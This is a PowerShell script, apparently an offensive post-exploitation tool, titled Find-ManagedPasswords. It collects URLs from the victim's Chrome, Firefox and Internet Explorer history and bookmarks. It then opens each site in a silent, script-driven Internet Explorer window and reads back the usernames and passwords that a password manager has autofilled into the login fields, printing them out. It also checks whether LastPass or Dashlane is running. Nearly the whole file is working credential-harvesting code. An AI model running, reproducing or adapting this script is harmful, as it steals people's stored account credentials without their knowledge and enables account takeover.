##########################################
# Start Browser History Section
##########################################
# Lot's taken from:
# https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1

Function Get-InternetExplorerBookmarks {
    Param(
        $UserName = $env:USERNAME
    )
    $favorites = Get-ChildItem -Path "$Env:SystemDrive\Users\$UserName\Favorites\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
    $urls = @()
    foreach ($favorite in $favorites) {
        Get-Content -Path $favorite.FullName | ForEach-Object {
            if ($_.Startswith('URL')) {
                $urls += $_.Substring($_.IndexOf('=') + 1)
            }
        }
    }
    
    return $urls
}


Function Get-ChromeHistory {
    Param(
        $UserName = $env:USERNAME
    )
    $Path = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
    if (-not (Test-Path -Path $Path)){
        Write-Verbose "[*] Could not find Chrome history for username: $UserName"
        return
    }
    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $urls = Get-Content -Path $Path | Select-String -Pattern $regex -AllMatches | % {($_.Matches).Value} | Sort-Object -Unique
    
    return $urls
}


Function Get-ChromeBookmarks {
    Param(
        $UserName = $env:USERNAME
    )
    $Path = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    if (-not (Test-Path -Path $Path)){
        Write-Verbose "[*] Could not find Chrome bookmarks for username: $UserName"
        return
    }
    $data = Get-Content $Path -Raw | ConvertFrom-Json
    $urls = $data.roots.bookmark_bar.children.url

    return $urls
}

Function Get-FireFoxHistory {
    Param(
        $UserName = $env:USERNAME
    )
    $path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\"
    if (-not (Test-Path -Path $Path)){
        Write-Verbose "[*] Could not find FireFox history for username: $UserName"
        return
    }
    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $urls = Get-Content $path\places.sqlite | Select-String -Pattern $regex -AllMatches | % {($_.Matches).Value} | Sort -Unique

    return $urls
}

##########################################
# End Browser History Section
##########################################


##########################################
# Start Browser Automation Section
##########################################

Function Browse-Url ($Url) {
    $ie = New-Object -ComObject InternetExplorer.Application.1
    $ie.Visible = $True
    $ie.Silent = $True
    $ie.Navigate($Url)
    while ($ie.Busy) {Start-Sleep -Seconds 1}
    
    return $ie
}


Function Parse-Username ($BrowserObject) {
    if ($BrowserObject.Document.getElementById('username')) {
        $username = $BrowserObject.Document.getElementById('username')
    }
    elseif ($BrowserObject.Document.getElementById('user_name')) {
        $username = $BrowserObject.Document.getElementById('user_name')
    }
    elseif ($BrowserObject.Document.getElementById('j_username')) {
        $username = $BrowserObject.Document.getElementById('j_username')
    }
    elseif ($BrowserObject.Document.getElementById('email')) {
        $username = $BrowserObject.Document.getElementById('email')
    }
    elseif ($BrowserObject.Document.getElementById('os_username')) {
        $username = $BrowserObject.Document.getElementById('os_username')
    }
    elseif ($BrowserObject.Document.getElementById('halogenLoginID')) {
        $username = $BrowserObject.Document.getElementById('halogenLoginID')
    }
    elseif ($BrowserObject.Document.getElementById('ctl00_cpContent_txtUserName')) {
        $username = $BrowserObject.Document.getElementById('ctl00_cpContent_txtUserName')
    }
    elseif ($BrowserObject.Document.getElementById('add')) {
        $username = $BrowserObject.Document.getElementById('add')
    }

    return $username.Value
}


Function Parse-Password ($BrowserObject) {
    if ($BrowserObject.Document.getElementById('password')) {
        $password = $BrowserObject.Document.getElementById('password')
    }
    elseif ($BrowserObject.Document.getElementById('j_password')) {
        $password = $BrowserObject.Document.getElementById('j_password')
    }
    elseif ($BrowserObject.Document.getElementById('os_password')) {
        $password = $BrowserObject.Document.getElementById('os_password')
    }
    elseif ($BrowserObject.Document.getElementById('halogenLoginPassword')) {
        $password = $BrowserObject.Document.getElementById('halogenLoginPassword')
    }
    elseif ($BrowserObject.Document.getElementById('ctl00_cpContent_txtPassword')) {
        $password = $BrowserObject.Document.getElementById('ctl00_cpContent_txtPassword')
    }
    elseif ($BrowserObject.Document.getElementById('pin')) {
        $password = $BrowserObject.Document.getElementById('pin')
    }

    return $password.Value
}


##########################################
# End Browser Automation Section
##########################################


##########################################
# Start Password Manager Detection Section
##########################################

Function Detect-PasswordManager {
    $PasswordManager = Get-Process | Select-Object Name | Where-Object {$_ -match "lastpass" -or $_ -match "dashlane"}
    if ($PasswordManager) {
        $PasswordManager = $PasswordManager.Name
        Write-Output "A password manager has been detected. Process Name: $PasswordManager `n"
    }
    else {
        Write-Output "A password manager was not detected `n"
    } 
}

##########################################
# End Password Manager Detection Section
##########################################

Function Find-ManagedPasswords {
    [cmdletbinding()]
    Param(

    [Parameter(Mandatory = $false)]
    $URLFile,

    [Parameter(Mandatory = $false)]
    [switch]
    $DisplayStatus,

    [Parameter(Mandatory = $false)]
    [switch]
    $URLsFromChromeHistory,

    [Parameter(Mandatory = $false)]
    [switch]
    $URLsFromChromeBookmarks,

    [Parameter(Mandatory = $false)]
    [switch]
    $URLsFromFireFoxHistory,

    [Parameter(Mandatory = $false)]
    [switch]
    $DetectPasswordManager,

    [Parameter(Mandatory = $false)]
    [switch]
    $URLsFromInternetExplorerBookmarks

    )

    $urls = @( )
    if ($URLFile) {
        if (-not (Test-Path -Path $URLFile)){
            Write-Verbose "[-] Unable to access $URLFile. Check the path and try again"
            return
        }
        $urls += Get-Content $URLFile
    }
    if ($URLsFromChromeHistory) {
        $urls += Get-ChromeHistory
    }
    if ($URLsFromChromeBookmarks) {
        $urls += Get-ChromeBookmarks
    }
    if ($URLsFromFireFoxHistory) {
        $urls += Get-FireFoxHistory
    }
    if ($URLsFromInternetExplorerBookmarks) {
        $urls += Get-InternetExplorerBookmarks
    }

    $urls = $urls | Sort-Object -Unique
    $totalurls = $urls.Count
    Write-Output "Loaded $totalurls URLs for browsing"
    $counter = 1

    foreach($url in $urls) {
        Write-Output "Browsing $url -  Site $counter of $totalurls"
        $Browser = Browse-Url -Url $url
        Start-Sleep -Seconds 2
        if ($Browser -eq $null) { continue }
        $user = Parse-Username -BrowserObject $Browser
        $pass = Parse-Password -BrowserObject $Browser
        $Browser.Quit()
        $counter += 1

        if ($user -or $pass) {
            Write-Output "URL: $url"
            Write-Output "Username: $user"
            Write-Output "Password: $pass"
            Write-Output ""
        }
    }
}